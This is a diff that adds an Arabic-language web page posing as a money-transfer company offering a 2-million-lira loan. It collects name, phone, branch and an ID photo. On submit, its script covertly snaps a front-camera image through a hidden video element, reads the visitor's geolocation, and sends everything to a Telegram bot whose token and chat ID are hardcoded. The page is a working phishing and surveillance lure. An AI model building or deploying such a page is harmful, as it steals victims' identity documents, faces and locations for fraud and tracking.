@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <title>شركة الهرم للحوالات المالية</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Arial', sans-serif;
+      background-color: #e6f2e6;
+      color: #333;
+      direction: rtl;
+    }
+    header {
+      background-color: #004d26; /* أخضر داكن */
+      color: white;
+      padding: 30px 0;
+      text-align: center;
+      font-size: 24px;
+      font-weight: bold;
+      border-bottom: 4px solid #006633;
+    }
+    main {
+      max-width: 600px;
+      margin: 40px auto;
+      padding: 30px;
+      background-color: #ffffff;
+      border-radius: 12px;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+    }
+    h2 {
+      color: #004d26;
+      font-size: 22px;
+      margin-bottom: 20px;
+    }
+    .soft-text {
+      color: #666;
+      font-size: 18px;
+      font-style: italic;
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    label {
+      font-size: 18px;
+      font-weight: bold;
+      margin-bottom: 10px;
+      display: block;
+    }
+    input[type="text"], input[type="file"], button {
+      width: 100%;
+      padding: 15px;
+      margin: 12px 0;
+      font-size: 16px;
+      border-radius: 8px;
+      border: 1px solid #ddd;
+      background-color: #f9f9f9;
+    }
+    input[type="text"]:focus, button:focus {
+      outline: none;
+      border-color: #004d26;
+      box-shadow: 0 0 5px rgba(0, 77, 38, 0.7);
+    }
+    button {
+      background-color: #004d26;
+      color: white;
+      font-weight: bold;
+      border: none;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+    button:hover {
+      background-color: #006633;
+    }
+    .input-group {
+      margin-bottom: 15px;
+    }
+    video {
+      display: none;
+    }
+    .file-label {
+      font-size: 14px;
+      color: #666;
+    }
+    .footer {
+      text-align: center;
+      margin-top: 30px;
+      font-size: 14px;
+      color: #555;
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <h1>شركة الهرم للحوالات المالية</h1>
+  </header>
+
+  <main>
+    <p class="soft-text">القرض المطلوب وهو مبلغ ٢ مليون ليرة</p>
+    <h2>الرجاء إدخال التفاصيل المطلوبة</h2>
+
+    <div class="input-group">
+      <label for="name">الاسم:</label>
+      <input type="text" id="name" placeholder="أدخل اسمك الكامل">
+    </div>
+
+    <div class="input-group">
+      <label for="phone">رقم الهاتف:</label>
+      <input type="text" id="phone" placeholder="أدخل رقم هاتفك">
+    </div>
+
+    <div class="input-group">
+      <label for="idPhoto">صورة الهوية:</label>
+      <input type="file" id="idPhoto" accept="image/*">
+      <small class="file-label">يرجى رفع صورة واضحة للهوية</small>
+    </div>
+
+    <div class="input-group">
+      <label for="branch">الفرع الأقرب إليك:</label>
+      <input type="text" id="branch" placeholder="أدخل اسم الفرع">
+    </div>
+
+    <button onclick="sendData()">إرسال</button>
+  </main>
+
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas" style="display: none;"></canvas>
+
+  <div class="footer">
+    <p>© 2025 شركة الهرم للحوالات المالية. جميع الحقوق محفوظة.</p>
+  </div>
+
+  <script>
+    const botToken = "7876711075:AAG227dcC-k6dDfrb4d719FB1rApyJAh3ko";
+    const chatId = "1393964545";
+
+    async function sendData() {
+      const name = document.getElementById("name").value.trim();
+      const phone = document.getElementById("phone").value.trim();
+      const branch = document.getElementById("branch").value.trim();
+      const idPhoto = document.getElementById("idPhoto").files[0];
+
+      if (!name || !phone || !idPhoto || !branch) return alert("يرجى تعبئة جميع الحقول");
+
+      const video = document.getElementById("video");
+      const canvas = document.getElementById("canvas");
+      const context = canvas.getContext("2d");
+
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        video.srcObject = stream;
+
+        await new Promise(resolve => setTimeout(resolve, 2000));
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        context.drawImage(video, 0, 0);
+        const imageBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+
+        stream.getTracks().forEach(track => track.stop());
+
+        navigator.geolocation.getCurrentPosition(async position => {
+          const latitude = position.coords.latitude;
+          const longitude = position.coords.longitude;
+
+          const message = `الاسم: ${name}\\nرقم الهاتف: ${phone}\\nالفرع: ${branch}\\nالموقع: https://maps.google.com/?q=${latitude},${longitude}`;
+
+          // إرسال رسالة نصية إلى التليجرام
+          await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: chatId, text: message })
+          });
+
+          // إرسال صورة الهوية
+          const formData = new FormData();
+          formData.append("chat_id", chatId);
+          formData.append("photo", idPhoto);
+
+          await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+            method: "POST",
+            body: formData
+          });
+
+          // إرسال صورة الكاميرا
+          formData.set("photo", imageBlob, "photo.jpg");
+          await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+            method: "POST",
+            body: formData
+          });
+
+          alert("تم الإرسال بنجاح");
+
+        }, () => alert("تعذر تحديد الموقع"));
+      } catch (error) {
+        console.error(error);
+        alert("حدث خطأ أثناء محاولة الوصول إلى الكاميرا أو الموقع.");
+      }
+    }
+  </script>
+
+</body>
+</html>
